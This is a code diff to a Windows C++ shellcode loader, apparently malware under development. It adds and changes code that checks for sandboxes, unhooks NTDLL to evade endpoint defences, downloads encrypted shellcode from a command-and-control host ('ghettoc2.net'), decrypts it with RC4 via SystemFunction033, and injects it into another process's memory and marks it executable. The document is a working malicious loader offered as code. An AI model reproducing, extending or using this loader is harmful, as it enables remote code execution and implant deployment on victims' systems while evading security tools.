@@ -16,12 +16,15 @@
 
 #pragma warning (disable : 4996)
 
+using namespace std;
+
+
 // External or forward declared routines
 std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);
 BOOL ClearNTDLL();
 
-// For systemfunction032 (built in RC4 decrypt)
-typedef NTSTATUS(WINAPI* _SystemFunction032)(
+// For SystemFunction033 (built in RC4 decrypt)
+typedef NTSTATUS(WINAPI* _SystemFunction033)(
     struct ustring* memoryRegion,
     struct ustring* keyPointer);
 
@@ -30,6 +33,8 @@ struct ustring {
     USHORT MaximumLength;
     PUCHAR Buffer;
 } _data, key;
+
+unsigned char   buf[MAXSHELLCODESIZE];
 
 BOOL timing_CreateWaitableTimer(UINT delayInMillis)
 {
@@ -121,12 +126,18 @@ BOOL checkup()
 
 int main()
 {
-    char mykey[] = "advapi32.dll    ";
+	char _key[] = "advapi32.dll";
+	int i;
 
     if (!checkup()) {
         fprintf(stderr, "Bailing out\n");
         return 0;
     }
+
+#ifdef DEBUGGING
+	printf("Start unhooking, press any key to continue...\n");
+	getchar();
+#endif
 
     // Unhook NTDLL via indirect syscalls
     if (!ClearNTDLL()) {
@@ -139,20 +150,20 @@ int main()
     getchar();
 #endif
 
-    _SystemFunction032 SystemFunction032 = (_SystemFunction032)GetProcAddress(LoadLibrary(L"advapi32"), "SystemFunction032");
+    _SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibrary(L"advapi32"), "SystemFunction033");
 
     NTSTATUS        ntstatus;
     LPVOID          start_address = NULL;
     SIZE_T          code_size;
     DWORD           oldProtect = NULL;
-    unsigned char   buf[MAXSHELLCODESIZE];
 
 #ifdef DEBUGGING
     printf("Starting download\n");
 #endif
     std::vector<BYTE> shellcode = Download(L"ghettoc2.net\0", L"/c2/9d6cbdecabefe19dcf2e4b5469c9c5430ef450bd/tools/loader.enc\0");
 
-    USHORT shellcode_size = (unsigned int)shellcode.size();
+	int shellcode_size = (int)shellcode.size();
+
 #ifdef DEBUGGING
     printf("Finished download, shellcode size is %d\n", shellcode_size);
 #endif
@@ -212,36 +223,51 @@ int main()
 #endif
     }
 
-    memcpy(buf, &shellcode[0], shellcode_size);
+	fprintf(stderr, "Shellcode size is %d\n", shellcode_size);
+	std::copy(begin(shellcode), end(shellcode), buf);
+	fprintf(stderr, "Oofff\n");
 
-    // decrypt the downloaded shellcode with SystemFunction032
-    key.Buffer = (PUCHAR)(&mykey);
-    key.Length = (USHORT)(sizeof key);
-    _data.Buffer = (PUCHAR)&buf;
-    _data.Length = (USHORT)shellcode_size;
+	// decrypt the downloaded shellcode with SystemFunction033
+	key.Buffer = (PUCHAR)(&_key);
+	key.Length = sizeof(_key);
 
-    SystemFunction032(&_data, &key);
+	_data.Buffer = (PUCHAR)buf;
+	//_data.MaximumLength = shellcode_size;
+	//_data.Length = 0;
+	_data.Length = shellcode_size;
+
+	fprintf(stderr, "Shellcode size is %d\n", shellcode_size);
+
+	for (i = 0; i < shellcode_size; i++) {
+		fprintf(stderr, "0x%02x ", buf[i]);
+	}
+	fprintf(stderr, "\n");
+
+	SystemFunction033(&_data, &key);
+
+	fprintf(stderr, "Shellcode size is %d\n", shellcode_size);
 
 #ifdef DEBUGGING
-    printf("Decrypted, press enter to continue...\n");
-    getchar();
+	printf("Decrypted, press enter to continue...\n");
+	getchar();
 #endif
 
-    // Copy shellcode into allocated memory
-    ntstatus = NtWriteVirtualMemory(process_info->hProcess, start_address, (PVOID)buf, shellcode_size, 0);
-    if (!NT_SUCCESS(ntstatus)) {
+
+	// Copy encrypted shellcode into allocated memory
+	ntstatus = NtWriteVirtualMemory(process_info->hProcess, start_address, (PVOID)buf, shellcode_size, 0);
+	if (!NT_SUCCESS(ntstatus)) {
 #ifdef DEBUGGING
-        fprintf(stderr, "NtWriteVirtualMemory error, ntstatus is %x\n", (unsigned int)ntstatus);
+		fprintf(stderr, "NtWriteVirtualMemory error, ntstatus is %x\n", (unsigned int)ntstatus);
 #endif
-        return 0;
-    }
-    else {
+		return 0;
+	}
+	else {
 #ifdef DEBUGGING
-        fprintf(stderr, "Memory Written\n");
-        printf("Press enter to continue...\n");
-        getchar();
+		fprintf(stderr, "Memory written with encrypted shellcode\n");
+		printf("Press enter to continue...\n");
+		getchar();
 #endif
-    }
+	}
 
     ntstatus = NtProtectVirtualMemory(process_info->hProcess, &start_address, (PSIZE_T)&code_size, PAGE_EXECUTE_READ, &oldProtect);
     if (!NT_SUCCESS(ntstatus)) {
